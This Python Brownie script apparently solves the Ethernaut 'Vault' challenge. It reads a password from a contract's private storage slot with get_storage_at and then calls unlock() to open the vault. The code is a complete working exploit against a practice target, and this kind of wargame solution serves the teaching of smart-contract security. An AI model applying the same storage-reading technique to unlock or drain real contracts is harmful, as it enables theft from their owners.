# from lib2to3.pytree import convert
import brownie
from scripts.helpful_scripts import get_account
from brownie import web3, interface, convert

ETHERNAUT_INSTANCE = "0x6397B7130662EEa63eBfD9fAfE82Fd053C1a21Bb"


def main():

    player = get_account()
    print(f"Player = {player}")

    password = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 1)
    print(f"\nPassword = {password}\n")

    locked = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
    print(f"\nVault is locked = {convert.to_bool(locked)}")

    vault = interface.VaultInterface(ETHERNAUT_INSTANCE)
    vault.unlock(password, {"from": player})

    locked = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
    print(f"\nVault is locked = {convert.to_bool(locked)}")
